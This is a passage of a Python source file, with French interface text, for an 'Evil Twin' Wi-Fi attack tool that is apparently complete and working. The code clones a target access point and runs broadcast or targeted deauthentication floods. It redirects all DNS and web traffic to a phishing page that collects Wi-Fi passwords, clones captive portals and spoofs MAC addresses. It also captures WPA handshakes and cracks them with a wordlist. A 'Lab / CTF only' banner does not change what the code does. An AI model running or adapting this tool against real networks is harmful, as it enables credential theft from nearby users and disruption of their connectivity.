            self.log(f"❌ Echec monitor sur {iface}")
            return False
        except Exception as e:
            self.log(f"❌ Monitor: {e}")
            return False

    # ---------- ATTAQUE ----------

    def start_attack(self, ap_name, channel, bssid=None, stealth=False,
                     use_https=False, phish_port=80, portal_url=None):
        if self.running:
            self.log("⚠️ Deja en cours")
            return False
        if not self.interface:
            self.log("❌ Pas d'interface")
            return False

        self.ap_name = ap_name
        self.channel = str(channel)
        self.original_bssid = bssid
        self.bssid = bssid or "00:11:22:33:44:55"
        self.stealth_mode = stealth
        self.running = True
        self.passwords = []
        self.handshakes = []
        self.processes = {}
        self._cleanup_done = False

        self.log(f"🚀 Evil Twin sur '{ap_name}' canal {channel}")

        # Clone du portail si demande
        if portal_url:
            self.portal_cloner = CaptivePortalCloner(log=self.log)
            if not self.portal_cloner.clone(portal_url):
                self.log("⚠️ Clone echoue, fallback page par defaut")
                self.portal_cloner = None

        if stealth:
            self._enable_stealth()

        # 1. Serveur phishing
        self.phishing_server = PhishingServer(
            port=phish_port, ssid=ap_name,
            password_callback=self.on_password_captured,
            use_https=use_https, portal_cloner=self.portal_cloner
        )
        self.phishing_server.start()

        # 2. AP
        if not self._start_ap():
            self.log("❌ Echec AP")
            self.stop_attack()
            return False

        time.sleep(2)
        self._setup_at0()
        self._start_dnsmasq()
        self._enable_ip_forwarding()
        self._setup_iptables(phish_port)
        self._start_handshake_capture()

        if not stealth:
            self.log("📡 Deauth auto...")
            self.deauth_attack()

        self.log("✅ Attaque en cours")
        return True

    def _start_ap(self):
        try:
            cmd = ["airbase-ng", "-e", self.ap_name, "-c", self.channel,
                   "-a", self.bssid, self.interface]
            self.log(f"▶️  {' '.join(cmd)}")
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
            self.processes["airbase-ng"] = proc
            time.sleep(2)
            if proc.poll() is not None:
                self.log("❌ airbase-ng arrete immediatement")
                return False
            self.log(f"✅ AP: {self.ap_name} ({self.bssid})")
            return True
        except Exception as e:
            self.log(f"❌ airbase-ng: {e}")
            return False

    def _setup_at0(self):
        try:
            for _ in range(10):
                r = subprocess.run(["ip", "link", "show", "at0"],
                                   capture_output=True, text=True)
                if r.returncode == 0:
                    break
                time.sleep(1)
            subprocess.run(["ip", "addr", "add", f"{self.at0_ip}/24", "dev", "at0"],
                           capture_output=True)
            subprocess.run(["ip", "link", "set", "at0", "up"], capture_output=True)
            self.log(f"✅ at0: {self.at0_ip}/24")
        except Exception as e:
            self.log(f"⚠️ at0: {e}")

    def _start_dnsmasq(self):
        try:
            subprocess.run(["pkill", "-f", "dnsmasq.*at0"], capture_output=True)
            time.sleep(0.5)
            cmd = ["dnsmasq", "--interface=at0", "--bind-interfaces",
                   f"--dhcp-range={self.dhcp_range}",
                   f"--dhcp-option=3,{self.at0_ip}",
                   f"--dhcp-option=6,{self.at0_ip}",
                   f"--address=/#/{self.at0_ip}",
                   "--no-resolv", "--no-daemon"]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
            self.processes["dnsmasq"] = proc
            time.sleep(1)
            if proc.poll() is not None:
                self.log("❌ dnsmasq a echoue (port 53 occupe ?)")
                return False
            self.log("✅ dnsmasq actif")
            return True
        except Exception as e:
            self.log(f"❌ dnsmasq: {e}")
            return False

    def _enable_ip_forwarding(self):
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           check=True, capture_output=True)
            self.log("✅ IP forwarding")
        except Exception:
            self.log("⚠️ IP forwarding echec")

    def _setup_iptables(self, phish_port):
        try:
            subprocess.run(["iptables", "-t", "nat", "-F", "PREROUTING"],
                           capture_output=True)
            for port in ("80", "443"):
                subprocess.run([
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", "at0", "-p", "tcp", "--dport", port,
                    "-j", "REDIRECT", "--to-port", str(phish_port)
                ], check=True, capture_output=True)
            self.log(f"✅ iptables at0 -> {phish_port}")
        except Exception as e:
            self.log(f"⚠️ iptables: {e}")

    def _start_handshake_capture(self):
        iface = self.deauth_interface or self.monitor_interface
        if not iface or iface == self.interface:
            self.log("⚠️ Pas d'interface dediee handshake (1 seule carte)")
            return
        self.log(f"📡 Handshake capture sur {iface}")
        try:
            prefix = "/tmp/eviltwin_hs"
            for f in Path("/tmp").glob("eviltwin_hs*"):
                try:
                    f.unlink()
                except Exception:
                    pass
            cmd = ["airodump-ng", "-c", self.channel, "--bssid", self.original_bssid,
                   "-w", prefix, iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
            self.processes["airodump-ng"] = proc

            def watch():
                time.sleep(3)
                while self.running:
                    for cap in Path("/tmp").glob("eviltwin_hs*.cap"):
                        try:
                            if cap.stat().st_size < 1024:
                                continue
                            r = subprocess.run(["aircrack-ng", str(cap)],
                                               capture_output=True, text=True, timeout=10)
                            if "1 handshake" in r.stdout:
                                s = str(cap)
                                if s not in self.handshakes:
                                    self.handshakes.append(s)
                                    self.log(f"✅ Handshake: {cap}")
                        except Exception:
                            pass
                    time.sleep(5)

            threading.Thread(target=watch, daemon=True).start()
        except Exception as e:
            self.log(f"❌ Handshake: {e}")

    def deauth_attack(self, target_mac=None):
        if not self.running or not self.original_bssid:
            self.log("⚠️ Pas de cible")
            return
        iface = self.deauth_interface or self.monitor_interface
        if not iface:
            self.log("⚠️ Pas d'interface deauth")
            return
        if iface == self.interface:
            self.log("⚠️ Deauth impossible sur meme interface que airbase-ng")
            return
        if target_mac:
            self.log(f"📡 Deauth cible {target_mac}")
        else:
            self.log("📡 Deauth broadcast")
        try:
            cmd = ["aireplay-ng", "-0", "5" if target_mac else "0",
                   "-a", self.original_bssid]
            if target_mac:
                cmd += ["-c", target_mac]
            cmd.append(iface)
            old = self.processes.get("aireplay-ng")
            if old and old.poll() is None:
                try:
                    os.killpg(os.getpgid(old.pid), signal.SIGTERM)
                except Exception:
                    pass
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
            self.processes["aireplay-ng"] = proc
            self.log("✅ Deauth lancee")
        except Exception as e:
            self.log(f"❌ Deauth: {e}")

    def selective_jamming(self, target_mac):
        self.log(f"🎯 Deauth ciblee {target_mac}")
        old = self.processes.get("aireplay-ng")
        if old and old.poll() is None:
            try:
                os.killpg(os.getpgid(old.pid), signal.SIGTERM)
                old.wait(timeout=2)
            except Exception:
                pass
        self.deauth_attack(target_mac)

    def get_clients(self):
        clients = []
        try:
            r = subprocess.run(["ip", "neigh", "show", "dev", "at0"],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.split("\n"):
                m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+dev\s+at0\s+lladdr\s+([0-9a-f:]+)", line)
                if m:
                    clients.append({"ip": m.group(1), "mac": m.group(2)})
            try:
                r2 = subprocess.run(["arp-scan", "--interface=at0", "--localnet"],
                                    capture_output=True, text=True, timeout=15)
                for line in r2.stdout.split("\n"):
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)", line)
                    if m:
                        e = {"ip": m.group(1), "mac": m.group(2)}
                        if e not in clients:
                            clients.append(e)
            except Exception:
                pass
        except Exception:
            pass
        return clients

    def on_password_captured(self, password, ip):
        self.passwords.append({"password": password, "ip": ip,
                               "timestamp": datetime.now().isoformat()})
        self.log(f"🔑 Capture: {password} depuis {ip}")

    def _enable_stealth(self):
        try:
            import random
            new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
            subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
            subprocess.run(["macchanger", "-m", new_mac, self.interface],
                           capture_output=True, stdout=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
            self.log(f"🕵️ MAC: {new_mac}")
        except Exception as e:
            self.log(f"⚠️ Stealth: {e}")

    # ---------- STOP ----------

    def _kill(self, name):
        p = self.processes.get(name)
        if not p or p.poll() is not None:
            return
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            try:
                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except Exception:
            pass

    def stop_attack(self):
        if self._cleanup_done:
            return
        self.log("🛑 Arret...")
        self.running = False
        if self.phishing_server:
            self.phishing_server.stop()
        for n in ["aireplay-ng", "airodump-ng", "dnsmasq", "airbase-ng"]:
            self._kill(n)
        try:
            subprocess.run(["iptables", "-t", "nat", "-F", "PREROUTING"],
                           capture_output=True)
            self.log("✅ iptables nettoye")
        except Exception:
            pass
        try:
            subprocess.run(["ip", "addr", "flush", "dev", "at0"], capture_output=True)
        except Exception:
            pass
        self._cleanup_done = True
        self.log("✅ Nettoyage termine")

    # ---------- EXPORT ----------

    def export_all(self):
        ts = time.strftime("%Y%m%d_%H%M%S")
        self.export_dir.mkdir(exist_ok=True)
        if self.passwords:
            p = self.export_dir / f"passwords_{ts}.json"
            with open(p, "w", encoding="utf-8") as f:
                json.dump(self.passwords, f, indent=2, ensure_ascii=False)
            self.log(f"✅ Passwords: {p}")
        if self.handshakes:
            for i, hs in enumerate(self.handshakes, 1):
                if os.path.exists(hs):
                    d = self.export_dir / f"handshake_{ts}_{i}.cap"
                    shutil.copy2(hs, d)
                    self.log(f"✅ Handshake: {d}")
        self.log(f"✅ Log: {self.log_file}")


# ==================== MENU CLI ====================

class EvilTwinCLI:
    def __init__(self):
        self.engine = EvilTwinEngine()
        self.engine.set_status_callback(self.log)
        self.current_networks = []
        self.selected_network = None
        self.running = True
        self.cracker = self.engine.cracker

    def log(self, m):
        print(f"[{time.strftime('%H:%M:%S')}] {m}")

    def clear_screen(self):
        os.system("clear" if os.name == "posix" else "cls")

    def show_banner(self):
        print(r"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ███████╗██╗   ██╗██╗██╗     ████████╗██╗    ██╗██╗███╗   ██╗     ║
║   ██╔════╝██║   ██║██║██║     ╚══██╔══╝██║    ██║██║████╗  ██║     ║
║   █████╗  ██║   ██║██║██║        ██║   ██║ █╗ ██║██║██╔██╗ ██║     ║
║   ██╔══╝  ╚██╗ ██╔╝██║██║        ██║   ██║███╗██║██║██║╚██╗██║     ║
║   ███████╗ ╚████╔╝ ██║███████╗   ██║   ╚███╔███╔╝██║██║ ╚████║     ║
║   ╚══════╝  ╚═══╝  ╚═╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝     ║
║                                                                      ║
║              EVIL TWIN ULTIME - JATHNIEL EDITION                     ║
║              v4.0 - Lab / CTF uniquement                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")

    def show_menu(self):
        print("""
┌─────────────────────────────────────────────────────────────────────┐
│  📌 MENU PRINCIPAL                                                  │
├─────────────────────────────────────────────────────────────────────┤
│  [1]  🔍 Scanner les reseaux WiFi                                   │
│  [2]  🎯 Selectionner une cible                                     │
│  [3]  🚀 Attaque (Mode Normal - deauth auto)                        │
│  [4]  🕵️ Attaque (Mode Stealth - sans deauth)                      │
│  [5]  📡 Deauth (tous les clients)                                  │
│  [6]  🎯 Deauth (ciblee)                                            │
│  [7]  👥 Voir les clients connectes                                 │
│  [8]  🔑 Voir les mots de passe captures                            │
│  [9]  🤝 Voir les handshakes captures                               │
│  [10] 💾 Exporter les donnees                                       │
│  [11] 🛑 Arreter l'attaque                                          │
│  [12] ⚙️  Configurer les interfaces (AP / deauth)                   │
│  [13] 🎭 Cloner un portail captif (avant attaque)                   │
│  [14] 📊 Lancer le dashboard web                                    │
│  [15] 🔓 Crack WPA offline (aircrack-ng)                            │
│  [0]  ❌ Quitter                                                    │
└─────────────────────────────────────────────────────────────────────┘
""")

    def show_interface_menu(self):
        print("\n📡 Interfaces WiFi:")
        ifaces = self.engine.list_interfaces() or ["wlan0", "wlan1"]
        for i, x in enumerate(ifaces, 1):
            print(f"  {i}. {x}")
        c = input("\n👉 Interface AP (airbase-ng) [1]: ").strip()
        if c.isdigit() and 1 <= int(c) <= len(ifaces):
            self.engine.set_interface(ifaces[int(c)-1])
        else:
            self.engine.set_interface(ifaces[0])
        print(f"✅ AP: {self.engine.interface}")

        if len(ifaces) > 1:
            others = [i for i in ifaces if i != self.engine.interface]
            print(f"\n📡 Autres interfaces:")
            for i, x in enumerate(others, 1):
                print(f"  {i}. {x}")
            c2 = input("\n👉 Interface deauth/sniff (0=aucune): ").strip()
            if c2.isdigit() and 1 <= int(c2) <= len(others):
                self.engine.set_deauth_interface(others[int(c2)-1])
                print(f"✅ Deauth: {self.engine.deauth_interface}")
                self.engine.check_monitor_mode(self.engine.deauth_interface)
        else:
            print("\n⚠️  Une seule interface. Deauth/handshake limites.")

    def show_networks(self):
        print("\n📡 Scan...")
        nets = self.engine.scan_wifi()
        self.current_networks = nets
        if not nets:
            print("❌ Aucun")
            return
        print("\n📶 RESEAUX:")
        print("-" * 70)
        for i, n in enumerate(nets, 1):
            print(f"  {i:2}. {n.get('ssid','?')[:30]:30} | {n.get('address','?')} | ch {n.get('channel','?')} | sig {n.get('signal','?')} | {n.get('encryption','?')}")
        print("-" * 70)

    def select_target(self):
        if not self.current_networks:
            print("❌ Scan d'abord (1)")
            return
        print("\n🎯 Cible:")
        for i, n in enumerate(self.current_networks, 1):
            print(f"  {i}. {n.get('ssid','?')}")
        c = input("\n👉 Choix: ").strip()
        if c.isdigit() and 1 <= int(c) <= len(self.current_networks):
            self.selected_network = self.current_networks[int(c)-1]
            self.engine.bssid = self.selected_network.get("address")
            self.engine.original_bssid = self.selected_network.get("address")
            print(f"✅ {self.selected_network.get('ssid')}")

    def start_attack(self, stealth=False):
        if not self.selected_network:
            print("❌ Cible d'abord (2)")
            return
        if self.engine.running:
            print("⚠️ Deja en cours")
            return
        n = self.selected_network
        self.engine.start_attack(
            ap_name=n["ssid"], channel=n.get("channel", "6"),
            bssid=n.get("address"), stealth=stealth, phish_port=80
        )

    def deauth_all(self): self.engine.deauth_attack()

    def deauth_selective(self):
        cs = self.engine.get_clients()
        if not cs:
            print("❌ Aucun client")
            return
        for i, c in enumerate(cs, 1):
            print(f"  {i}. {c['ip']} ({c['mac']})")
        ch = input("\n👉 Choix: ").strip()
        if ch.isdigit() and 1 <= int(ch) <= len(cs):
            self.engine.selective_jamming(cs[int(ch)-1]["mac"])

    def show_clients(self):
        cs = self.engine.get_clients()
        if not cs:
            print("📋 Aucun client")
            return
        print(f"\n👥 CLIENTS ({len(cs)}):")
        for c in cs:
            print(f"  • {c['ip']:15} {c['mac']}")

    def show_passwords(self):
        p = self.engine.passwords
        if not p:
            print("📋 Aucun")
            return
        print(f"\n🔑 CAPTURES ({len(p)}):")
        for x in p:
            print(f"  • user={x.get('username','?')} pass={x['password']} ip={x['ip']} @ {x['timestamp']}")

    def show_handshakes(self):
        h = self.engine.handshakes
        if not h:
            print("📋 Aucun")
            return
        for x in h:
            print(f"  • {x}")

    def export_data(self): self.engine.export_all()

    def configure_interfaces(self): self.show_interface_menu()

    # ---------- Module 1 : clone ----------

    def clone_portal(self):
        print("\n🎭 CLONER UN PORTAIL CAPTIF")
        print("Exemples: http://wifi.hotel.com, http://10.0.0.1/login")
        url = input("👉 URL du portail: ").strip()
        if not url:
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        cloner = CaptivePortalCloner(log=self.log)
        if cloner.clone(url):
            self.engine.portal_cloner = cloner
            print("✅ Portail clone. Il sera utilise a la prochaine attaque.")
        else:
            print("❌ Echec du clone")

    # ---------- Module 2 : dashboard ----------

    def start_dashboard(self):
        if self.engine.dashboard_server:
            print(f"ℹ️  Dashboard deja actif sur http://127.0.0.1:9090")
            return
        port_s = input("👉 Port dashboard [9090]: ").strip() or "9090"
        try:
            port = int(port_s)
        except ValueError:
            port = 9090
        self.engine.dashboard_server = DashboardServer(self.engine, port=port)
        self.engine.dashboard_server.start()
        print(f"✅ Dashboard: http://127.0.0.1:{port}")
        print("   (accessible depuis ton navigateur local)")

    # ---------- Module 5 : crack ----------

    def crack_menu(self):
        print("\n🔓 CRACK WPA OFFLINE")
        print("=" * 50)

        # 1. Choisir le .cap
        caps = list(self.engine.handshakes)
        # Ajouter les .cap du dossier exports
        for f in self.engine.export_dir.glob("*.cap"):
            s = str(f)
            if s not in caps:
                caps.append(s)
        # Ajouter saisie manuelle
        print("Sources disponibles:")
        for i, c in enumerate(caps, 1):
            print(f"  {i}. {c}")
        print(f"  m. Saisir un chemin manuellement")
        c = input("\n👉 Choix: ").strip()

        cap_path = None
        if c == "m":
            cap_path = input("Chemin du .cap: ").strip()
        elif c.isdigit() and 1 <= int(c) <= len(caps):
            cap_path = caps[int(c)-1]

        if not cap_path or not os.path.exists(cap_path):
            print("❌ Fichier .cap introuvable")
            return

        # 2. Wordlist
        wls = self.cracker.find_wordlists()
        print("\nWordlists trouvees:")
        for i, w in enumerate(wls, 1):
            print(f"  {i}. {w}")
        print("  m. Chemin manuel")
        wc = input("\n👉 Choix: ").strip()
        wordlist = None
        if wc == "m":
            wordlist = input("Chemin wordlist: ").strip()
        elif wc.isdigit() and 1 <= int(wc) <= len(wls):
            wordlist = wls[int(wc)-1]

        if not wordlist or not os.path.exists(wordlist):
            print("❌ Wordlist introuvable")
            return

        # 3. BSSID optionnel
        bssid = self.engine.original_bssid
        if not bssid:
            bssid = input("👉 BSSID (optionnel, Entree=auto): ").strip() or None

        # 4. Lancer
        print(f"\n🔓 Lancement du crack sur {cap_path} avec {wordlist}...")
        r = self.cracker.crack(cap_path, wordlist, bssid=bssid)
        print()
        if r["success"]:
            print(f"✅ MOT DE PASSE: {r['password']}")
            # Proposer l'export
            if input("💾 Exporter les resultats ? (o/n): ").lower() in ("o", "oui", "y"):
                p = self.engine.export_dir / f"crack_{int(time.time())}.json"
                with open(p, "w", encoding="utf-8") as f:
                    json.dump(r, f, indent=2, ensure_ascii=False)
                print(f"✅ {p}")
        else:
            print(f"❌ Echec: {r.get('error', 'inconnu')}")
            print(f"   Duree: {r['duration']:.1f}s")

    # ---------- RUN ----------

    def run(self):
        self.clear_screen()
        self.show_banner()
        self.show_interface_menu()
        input("\nEntree pour continuer...")

        while self.running:
            self.clear_screen()
            self.show_banner()
            self.show_menu()
            c = input("\n👉 Choix: ").strip()

            try:
                if c == "1": self.show_networks()
                elif c == "2": self.select_target()
                elif c == "3": self.start_attack(False)
                elif c == "4": self.start_attack(True)
                elif c == "5": self.deauth_all()
                elif c == "6": self.deauth_selective()
                elif c == "7": self.show_clients()
                elif c == "8": self.show_passwords()
                elif c == "9": self.show_handshakes()
                elif c == "10": self.export_data()
                elif c == "11": self.engine.stop_attack()
                elif c == "12": self.configure_interfaces()
                elif c == "13": self.clone_portal()
                elif c == "14": self.start_dashboard()
                elif c == "15": self.crack_menu()
                elif c == "0":
                    if self.engine.running:
                        self.engine.stop_attack()
                    if self.engine.dashboard_server:
                        self.engine.dashboard_server.stop()
                    self.running = False
                    print("👋 Au revoir!")
                else:
                    print("❌ Option invalide")
            except KeyboardInterrupt:
                print("\n⚠️ Interrompu")
            except Exception as e:
                print(f"❌ Erreur: {e}")
                import traceback
                traceback.print_exc()

            if self.running:
                input("\nEntree pour continuer...")


# ==================== MAIN ====================

def main():
    try:
        check_root()
        check_dependencies()
        cli = EvilTwinCLI()
        cli.run()
    except KeyboardInterrupt:
        print("\n\n👋 Interruption")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur fatale: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
